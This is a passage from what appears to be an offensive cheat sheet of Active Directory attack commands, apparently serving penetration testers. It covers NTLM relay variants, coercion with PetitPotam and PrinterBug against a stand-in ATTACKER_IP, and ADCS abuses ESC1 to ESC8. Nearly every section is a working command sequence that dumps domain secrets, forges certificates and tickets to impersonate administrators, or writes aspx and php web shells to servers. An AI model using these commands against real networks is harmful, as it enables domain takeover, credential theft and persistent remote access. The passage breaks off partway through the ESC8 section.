</span></span><span style="display:flex;"><span>TERM2&gt; ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap<span style="color:#960050;background-color:#1e0010">:</span>//s2016dc.testsegment.local -smb2support
</span></span><span style="display:flex;"><span>TERM1&gt; secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc
</span></span></code></pre></div></li>
<li>
<p>Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># create a new machine account</span>
</span></span><span style="display:flex;"><span>TERM1&gt; ntlmrelayx.py -t ldaps<span style="color:#960050;background-color:#1e0010">:</span>//rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support 
</span></span><span style="display:flex;"><span>TERM2&gt; python printerbug.py relaytest.local/username@second-dc-server <span style="color:#ae81ff">10.0</span>.2.6
</span></span><span style="display:flex;"><span>TERM1&gt; getST.py -spn host/second-dc-server.local <span style="color:#e6db74">&#39;relaytest.local/MACHINE$:PASSWORD&#39;</span> -impersonate DOMAIN_ADMIN_USER_NAME
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># connect using the ticket</span>
</span></span><span style="display:flex;"><span>export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
</span></span><span style="display:flex;"><span>secretsdump.py -k -no-pass second-dc-server.local -just-dc
</span></span></code></pre></div></li>
</ul>
<h4 id="ghost-potato---cve-2019-1384">
  Ghost Potato - CVE-2019-1384
  <a class="anchor" href="#ghost-potato---cve-2019-1384">#</a>
</h4>
<p>Requirements:</p>
<ul>
<li>User must be a member of the local Administrators group</li>
<li>User must be a member of the Backup Operators group</li>
<li>Token must be elevated</li>
</ul>
<p>Using a modified version of ntlmrelayx : <a href="https://shenaniganslabs.io/files/impacket-ghostpotato.zip">https://shenaniganslabs.io/files/impacket-ghostpotato.zip</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
</span></span></code></pre></div><h4 id="remotepotato0-dcom-dce-rpc-relay">
  RemotePotato0 DCOM DCE RPC relay
  <a class="anchor" href="#remotepotato0-dcom-dce-rpc-relay">#</a>
</h4>
<blockquote>
<p>It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine</p>
</blockquote>
<p>Requirements:</p>
<ul>
<li>a shell in session 0 (e.g. WinRm shell or SSH shell)</li>
<li>a privileged user is logged on in the session 1 (e.g. a Domain Admin user)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/antonioCoco/RemotePotato0/</span>
</span></span><span style="display:flex;"><span>Terminal&gt; sudo socat TCP-LISTEN<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">135</span>,fork,reuseaddr TCP<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">192.168</span>.83.<span style="color:#ae81ff">131</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">9998</span> &amp; <span style="color:#75715e"># Can be omitted for Windows Server &lt;= 2016</span>
</span></span><span style="display:flex;"><span>Terminal&gt; sudo ntlmrelayx.py -t ldap<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">192.168</span>.83.135 --no-wcf-server --escalate-user winrm_user_1
</span></span><span style="display:flex;"><span>Session0&gt; RemotePotato0.exe -r <span style="color:#ae81ff">192.168</span>.83.130 -p <span style="color:#ae81ff">9998</span> -s <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>Terminal&gt; psexec.py <span style="color:#e6db74">&#39;LAB/winrm_user_1:Password123!@192.168.83.135&#39;</span>
</span></span></code></pre></div><h4 id="dns-poisonning---relay-delegation-with-mitm6">
  DNS Poisonning - Relay delegation with mitm6
  <a class="anchor" href="#dns-poisonning---relay-delegation-with-mitm6">#</a>
</h4>
<p>Requirements:</p>
<ul>
<li>IPv6 enabled (Windows prefers IPV6 over IPv4)</li>
<li>LDAP over TLS (LDAPS)</li>
</ul>
<blockquote>
<p>ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account&rsquo;s name and password and modifies the delegation rights of it.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/fox-it/mitm6.git 
</span></span><span style="display:flex;"><span>cd /opt/tools/mitm6
</span></span><span style="display:flex;"><span>pip install .
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mitm6 -hw ws02 -d lab.local --ignore-nofqnd
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -d: the domain name that we filter our request on (the attacked domain)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -i: the interface we have mitm6 listen on for events</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -hw: host whitelist</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ntlmrelayx.py -ip <span style="color:#ae81ff">10.10</span>.10.10 -t ldaps<span style="color:#960050;background-color:#1e0010">:</span>//dc01.lab.local -wh attacker-wpad
</span></span><span style="display:flex;"><span>ntlmrelayx.py -ip <span style="color:#ae81ff">10.10</span>.10.10 -t ldaps<span style="color:#960050;background-color:#1e0010">:</span>//dc01.lab.local -wh attacker-wpad --add-computer
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -ip: the interface you want the relay to run on</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -wh: WPAD host, specifying your wpad file to serve</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -t: the target where you want to relay to</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># now granting delegation rights and then do a RBCD</span>
</span></span><span style="display:flex;"><span>ntlmrelayx.py -t ldaps<span style="color:#960050;background-color:#1e0010">:</span>//dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
</span></span><span style="display:flex;"><span>getST.py -spn cifs/target.lab.local lab.local/GENERATED\$ -impersonate Administrator  
</span></span><span style="display:flex;"><span>export KRB5CCNAME=administrator.ccache  
</span></span><span style="display:flex;"><span>secretsdump.py -k -no-pass target.lab.local  
</span></span></code></pre></div><h4 id="relaying-with-webdav-trick">
  Relaying with WebDav Trick
  <a class="anchor" href="#relaying-with-webdav-trick">#</a>
</h4>
<blockquote>
<p>Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB</p>
</blockquote>
<p><strong>Requirement</strong>:</p>
<ul>
<li>WebClient service</li>
</ul>
<p><strong>Exploitation</strong>:</p>
<ul>
<li>Disable HTTP in Responder: <code>sudo vi /usr/share/responder/Responder.conf</code></li>
<li>Generate a Windows machine name: <code>sudo responder -I eth0</code>, e.g: WIN-UBNW4FI3AP0</li>
<li>Prepare for RBCD against the DC: <code>python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support</code></li>
<li>Discover WebDAV services
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>webclientservicescanner <span style="color:#e6db74">&#39;domain.local&#39;</span>/<span style="color:#e6db74">&#39;user&#39;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;password&#39;</span>@<span style="color:#e6db74">&#39;machine&#39;</span>
</span></span><span style="display:flex;"><span>crackmapexec smb <span style="color:#e6db74">&#39;TARGETS&#39;</span> -d <span style="color:#e6db74">&#39;domain&#39;</span> -u <span style="color:#e6db74">&#39;user&#39;</span> -p <span style="color:#e6db74">&#39;password&#39;</span> -M webdav
</span></span><span style="display:flex;"><span>GetWebDAVStatus.exe <span style="color:#e6db74">&#39;machine&#39;</span>
</span></span></code></pre></div></li>
<li>Trigger the authentication to relay to our nltmrelayx: <code>PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4</code>, the listener host must be specified with the FQDN or full netbios name like <code>logger.domain.local@80/test.txt</code>. Specifying the IP results in anonymous auth instead of System.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># PrinterBug</span>
</span></span><span style="display:flex;"><span>dementor.py -d <span style="color:#e6db74">&#34;DOMAIN&#34;</span> -u <span style="color:#e6db74">&#34;USER&#34;</span> -p <span style="color:#e6db74">&#34;PASSWORD&#34;</span> <span style="color:#e6db74">&#34;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&#34;</span> <span style="color:#e6db74">&#34;ATTACKER_IP&#34;</span>
</span></span><span style="display:flex;"><span>SpoolSample.exe <span style="color:#e6db74">&#34;ATTACKER_IP&#34;</span> <span style="color:#e6db74">&#34;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># PetitPotam</span>
</span></span><span style="display:flex;"><span>Petitpotam.py <span style="color:#e6db74">&#34;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&#34;</span> <span style="color:#e6db74">&#34;ATTACKER_IP&#34;</span>
</span></span><span style="display:flex;"><span>Petitpotam.py -d <span style="color:#e6db74">&#34;DOMAIN&#34;</span> -u <span style="color:#e6db74">&#34;USER&#34;</span> -p <span style="color:#e6db74">&#34;PASSWORD&#34;</span> <span style="color:#e6db74">&#34;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&#34;</span> <span style="color:#e6db74">&#34;ATTACKER_IP&#34;</span>
</span></span><span style="display:flex;"><span>PetitPotam.exe <span style="color:#e6db74">&#34;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&#34;</span> <span style="color:#e6db74">&#34;ATTACKER_IP&#34;</span>
</span></span></code></pre></div></li>
<li>Use the created account to ask for a service ticket:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>.\Rubeus.exe hash /domain<span style="color:#960050;background-color:#1e0010">:</span>purple.lab /user<span style="color:#960050;background-color:#1e0010">:</span>WVLFLLKZ$ /password<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;iUAL)l&lt;i$;UzD7W&#39;</span>
</span></span><span style="display:flex;"><span>.\Rubeus.exe s4u /user<span style="color:#960050;background-color:#1e0010">:</span>WVLFLLKZ$ /aes256<span style="color:#960050;background-color:#1e0010">:</span>E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser<span style="color:#960050;background-color:#1e0010">:</span>Administrator /msdsspn<span style="color:#960050;background-color:#1e0010">:</span>host/pc1.purple.lab /altservice<span style="color:#960050;background-color:#1e0010">:</span>cifs /nowrap /ptt
</span></span><span style="display:flex;"><span>ls \\PC1.purple.lab\c$
</span></span><span style="display:flex;"><span><span style="color:#75715e"># IP of PC1: 10.0.0.4</span>
</span></span></code></pre></div></li>
</ul>
<h3 id="active-directory-certificate-services">
  Active Directory Certificate Services
  <a class="anchor" href="#active-directory-certificate-services">#</a>
</h3>
<ul>
<li>Find ADCS Server
<ul>
<li><code>crackmapexec ldap domain.lab -u username -p password -M adcs</code></li>
<li><code>ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=&lt;user&gt;,OU=Users,DC=domain,DC=local' -w '&lt;password&gt;' -b &quot;CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local&quot; dNSHostName</code></li>
</ul>
</li>
<li>Enumerate AD Enterprise CAs with certutil: <code>certutil.exe -config - -ping</code></li>
</ul>
<h4 id="esc1---misconfigured-certificate-templates">
  ESC1 - Misconfigured Certificate Templates
  <a class="anchor" href="#esc1---misconfigured-certificate-templates">#</a>
</h4>
<blockquote>
<p>Domain Users can enroll in the <strong>VulnTemplate</strong> template, which can be used for client authentication and has <strong>ENROLLEE_SUPPLIES_SUBJECT</strong> set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject.</p>
</blockquote>
<p>Requirements:</p>
<ul>
<li>Template that allows for AD authentication</li>
<li><strong>ENROLLEE_SUPPLIES_SUBJECT</strong> flag</li>
<li>[PKINIT] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage)</li>
</ul>
<p>Exploitation:</p>
<ul>
<li>Use <a href="https://github.com/GhostPack/Certify">Certify.exe</a> to see if there are any vulnerable templates
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Certify.exe find /vulnerable
</span></span><span style="display:flex;"><span>Certify.exe find /vulnerable /currentuser
</span></span><span style="display:flex;"><span><span style="color:#75715e"># or</span>
</span></span><span style="display:flex;"><span>PS&gt; Get-ADObject -LDAPFilter <span style="color:#e6db74">&#39;(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))&#39;</span> -SearchBase <span style="color:#e6db74">&#39;CN=Configuration,DC=lab,DC=local&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># or</span>
</span></span><span style="display:flex;"><span>certipy <span style="color:#e6db74">&#39;domain.local&#39;</span>/<span style="color:#e6db74">&#39;user&#39;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;password&#39;</span>@<span style="color:#e6db74">&#39;domaincontroller&#39;</span> find -bloodhound
</span></span></code></pre></div></li>
<li>Use Certify, <a href="https://github.com/eloypgz/certi">Certi</a> or <a href="https://github.com/ly4k/Certipy">Certipy</a> to request a Certificate and add an alternative name (user to impersonate)
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># request certificates for the machine account by executing Certify with the &#34;/machine&#34; argument from an elevated command prompt.</span>
</span></span><span style="display:flex;"><span>Certify.exe request /ca<span style="color:#960050;background-color:#1e0010">:</span>dc.domain.local\domain-DC-CA /template<span style="color:#960050;background-color:#1e0010">:</span>VulnTemplate /altname<span style="color:#960050;background-color:#1e0010">:</span>domadmin
</span></span><span style="display:flex;"><span>certi.py req <span style="color:#e6db74">&#39;contoso.local/Anakin@dc01.contoso.local&#39;</span> contoso-DC01-CA -k -n --alt-name han --template UserSAN
</span></span><span style="display:flex;"><span>certipy req <span style="color:#e6db74">&#39;corp.local/john:Passw0rd!@ca.corp.local&#39;</span> -ca <span style="color:#e6db74">&#39;corp-CA&#39;</span> -template <span style="color:#e6db74">&#39;ESC1&#39;</span> -alt <span style="color:#e6db74">&#39;administrator@corp.local&#39;</span>
</span></span></code></pre></div></li>
<li>Use OpenSSL and convert the certificate, do not enter a password
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>openssl pkcs12 -in cert.pem -keyex -CSP <span style="color:#e6db74">&#34;Microsoft Enhanced Cryptographic Provider v1.0&#34;</span> -export -out cert.pfx
</span></span></code></pre></div></li>
<li>Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span>domadmin /certificate<span style="color:#960050;background-color:#1e0010">:</span>C:\Temp\cert.pfx
</span></span></code></pre></div></li>
</ul>
<p><strong>WARNING</strong>: These certificates will still be usable even if the user or computer resets their password!</p>
<p><strong>NOTE</strong>: Look for <strong>EDITF_ATTRIBUTESUBJECTALTNAME2</strong>, <strong>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</strong>, <strong>ManageCA</strong> flags, and NTLM Relay to AD CS HTTP Endpoints.</p>
<h4 id="esc2---misconfigured-certificate-templates">
  ESC2 - Misconfigured Certificate Templates
  <a class="anchor" href="#esc2---misconfigured-certificate-templates">#</a>
</h4>
<p>Requirements:</p>
<ul>
<li>Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)</li>
</ul>
<p>Exploitation:</p>
<ul>
<li>Find template
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>PS &gt; Get-ADObject -LDAPFilter <span style="color:#e6db74">&#39;(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))&#39;</span> -SearchBase <span style="color:#e6db74">&#39;CN=Configuration,DC=megacorp,DC=local&#39;</span>
</span></span></code></pre></div></li>
<li>Request a certificate specifying the <code>/altname</code> as a domain admin like in <a href="#esc1---misconfigured-certificate-templates">ESC1</a>.</li>
</ul>
<h4 id="esc3---misconfigured-enrollment-agent-templates">
  ESC3 - Misconfigured Enrollment Agent Templates
  <a class="anchor" href="#esc3---misconfigured-enrollment-agent-templates">#</a>
</h4>
<blockquote>
<p>ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users</p>
</blockquote>
<ul>
<li>Request a certificate based on the vulnerable certificate template ESC3.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>$ certipy req <span style="color:#e6db74">&#39;corp.local/john:Passw0rd!@ca.corp.local&#39;</span> -ca <span style="color:#e6db74">&#39;corp-CA&#39;</span> -template <span style="color:#e6db74">&#39;ESC3&#39;</span>
</span></span><span style="display:flex;"><span>[*] Saved certificate and private key to <span style="color:#e6db74">&#39;john.pfx&#39;</span>
</span></span></code></pre></div></li>
<li>Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>$ certipy req <span style="color:#e6db74">&#39;corp.local/john:Passw0rd!@ca.corp.local&#39;</span> -ca <span style="color:#e6db74">&#39;corp-CA&#39;</span> -template <span style="color:#e6db74">&#39;User&#39;</span> -on-behalf-of <span style="color:#e6db74">&#39;corp\administrator&#39;</span> -pfx <span style="color:#e6db74">&#39;john.pfx&#39;</span>
</span></span></code></pre></div></li>
</ul>
<h4 id="esc4---access-control-vulnerabilities">
  ESC4 - Access Control Vulnerabilities
  <a class="anchor" href="#esc4---access-control-vulnerabilities">#</a>
</h4>
<blockquote>
<p>Enabling the <code>mspki-certificate-name-flag</code> flag for a template that allows for domain authentication, allow attackers to &ldquo;push a misconfiguration to a template leading to ESC1 vulnerability</p>
</blockquote>
<ul>
<li>Search for <code>WriteProperty</code> with value <code>00000000-0000-0000-0000-000000000000</code> using <a href="https://github.com/fortalice/modifyCertTemplate">modifyCertTemplate</a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip <span style="color:#ae81ff">10.10</span>.10.10 -get-acl
</span></span></code></pre></div></li>
<li>Add the <code>ENROLLEE_SUPPLIES_SUBJECT</code> (ESS) flag to perform ESC1
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip <span style="color:#ae81ff">10.10</span>.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template. </span>
</span></span><span style="display:flex;"><span>C:\&gt;StandIn.exe --adcs --filter WebServer --ess --add
</span></span></code></pre></div></li>
<li>Perform ESC1 and then restore the value
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip <span style="color:#ae81ff">10.10</span>.10.10 -value <span style="color:#ae81ff">0</span> -property mspki-Certificate-Name-Flag
</span></span></code></pre></div></li>
</ul>
<p>Using Certipy</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># overwrite the configuration to make it vulnerable to ESC1</span>
</span></span><span style="display:flex;"><span>certipy template <span style="color:#e6db74">&#39;corp.local/johnpc$@ca.corp.local&#39;</span> -hashes <span style="color:#960050;background-color:#1e0010">:</span>fc525c9683e8fe067095ba2ddc971889 -template <span style="color:#e6db74">&#39;ESC4&#39;</span> -save-old
</span></span><span style="display:flex;"><span><span style="color:#75715e"># request a certificate based on the ESC4 template, just like ESC1.</span>
</span></span><span style="display:flex;"><span>certipy req <span style="color:#e6db74">&#39;corp.local/john:Passw0rd!@ca.corp.local&#39;</span> -ca <span style="color:#e6db74">&#39;corp-CA&#39;</span> -template <span style="color:#e6db74">&#39;ESC4&#39;</span> -alt <span style="color:#e6db74">&#39;administrator@corp.local&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># restore the old configuration</span>
</span></span><span style="display:flex;"><span>certipy template <span style="color:#e6db74">&#39;corp.local/johnpc$@ca.corp.local&#39;</span> -hashes <span style="color:#960050;background-color:#1e0010">:</span>fc525c9683e8fe067095ba2ddc971889 -template <span style="color:#e6db74">&#39;ESC4&#39;</span> -configuration ESC4.json
</span></span></code></pre></div><h4 id="esc6---editf_attributesubjectaltname2">
  ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
  <a class="anchor" href="#esc6---editf_attributesubjectaltname2">#</a>
</h4>
<blockquote>
<p>If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name.</p>
</blockquote>
<p>Exploitation:</p>
<ul>
<li>Use <a href="https://github.com/GhostPack/Certify">Certify.exe</a> to check for <strong>UserSpecifiedSAN</strong> flag state which refers to the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Certify.exe cas
</span></span></code></pre></div></li>
<li>Request a certificate for a template and add an altname, even though the default <code>User</code> template doesn&rsquo;t normally allow to specify alternative names
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>.\Certify.exe request /ca<span style="color:#960050;background-color:#1e0010">:</span>dc.domain.local\domain-DC-CA /template<span style="color:#960050;background-color:#1e0010">:</span>User /altname<span style="color:#960050;background-color:#1e0010">:</span>DomAdmin
</span></span></code></pre></div></li>
</ul>
<p>Mitigation:</p>
<ul>
<li>Remove the flag : <code>certutil.exe -config &quot;CA01.domain.local\CA01&quot; -setreg &quot;policy\EditFlags&quot; -EDITF_ATTRIBUTESUBJECTALTNAME2</code></li>
</ul>
<h4 id="esc7---vulnerable-certificate-authority-access-control">
  ESC7 - Vulnerable Certificate Authority Access Control
  <a class="anchor" href="#esc7---vulnerable-certificate-authority-access-control">#</a>
</h4>
<p>Exploitation:</p>
<ul>
<li>Detect CAs that allow low privileged users the <code>ManageCA</code>  or <code>Manage Certificates</code> permissions
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Certify.exe find /vulnerable
</span></span></code></pre></div></li>
<li>Change the CA settings to enable the SAN extension for all the templates under the vulnerable CA (ESC6)
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Certify.exe setconfig /enablesan /restart
</span></span></code></pre></div></li>
<li>Request the certificate with the desired SAN.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Certify.exe request /template<span style="color:#960050;background-color:#1e0010">:</span>User /altname<span style="color:#960050;background-color:#1e0010">:</span>super.adm
</span></span></code></pre></div></li>
<li>Grant approval if required or disable the approval requirement
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Grant</span>
</span></span><span style="display:flex;"><span>Certify.exe issue /id<span style="color:#960050;background-color:#1e0010">:</span>[<span style="color:#66d9ef">REQUEST ID</span>]
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disable</span>
</span></span><span style="display:flex;"><span>Certify.exe setconfig /removeapproval /restart
</span></span></code></pre></div></li>
</ul>
<p>Alternative exploitation from <strong>ManageCA</strong> to <strong>RCE</strong> on ADCS server:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Get the current CDP list. Useful to find remote writable shares:</span>
</span></span><span style="display:flex;"><span>Certify.exe writefile /ca<span style="color:#960050;background-color:#1e0010">:</span>SERVER\ca-name /readonly
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Write an aspx shell to a local web directory:</span>
</span></span><span style="display:flex;"><span>Certify.exe writefile /ca<span style="color:#960050;background-color:#1e0010">:</span>SERVER\ca-name /path<span style="color:#960050;background-color:#1e0010">:</span>C:\Windows\SystemData\CES\CA-Name\shell.aspx /input<span style="color:#960050;background-color:#1e0010">:</span>C:\Local\Path\shell.aspx
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Write the default asp shell to a local web directory:</span>
</span></span><span style="display:flex;"><span>Certify.exe writefile /ca<span style="color:#960050;background-color:#1e0010">:</span>SERVER\ca-name /path<span style="color:#960050;background-color:#1e0010">:</span>c:\inetpub\wwwroot\shell.asp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Write a php shell to a remote web directory:</span>
</span></span><span style="display:flex;"><span>Certify.exe writefile /ca<span style="color:#960050;background-color:#1e0010">:</span>SERVER\ca-name /path<span style="color:#960050;background-color:#1e0010">:</span>\\remote.server\share\shell.php /input<span style="color:#960050;background-color:#1e0010">:</span>C:\Local\path\shell.php
</span></span></code></pre></div><h4 id="esc8---ad-cs-relay-attack">
  ESC8 - AD CS Relay Attack
  <a class="anchor" href="#esc8---ad-cs-relay-attack">#</a>
</h4>
<blockquote>
<p>An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.</p>
</blockquote>
<p>Require <a href="https://github.com/SecureAuthCorp/impacket/pull/1101">Impacket PR #1101</a></p>
<ul>
<li>
<p><strong>Version 1</strong>: NTLM Relay + Rubeus + PetitPotam</p>
